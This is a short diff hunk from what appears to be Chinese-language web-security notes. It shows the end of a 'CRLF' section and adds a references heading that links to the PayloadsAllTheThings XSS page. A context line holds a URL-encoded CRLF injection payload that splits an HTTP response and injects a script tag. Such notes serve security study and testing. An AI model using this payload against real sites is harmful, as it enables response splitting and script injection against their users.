@@ -301,3 +301,6 @@ CRLF
 
 	``%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E``
 
+参考
+---------------------------------
++ ``https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/``
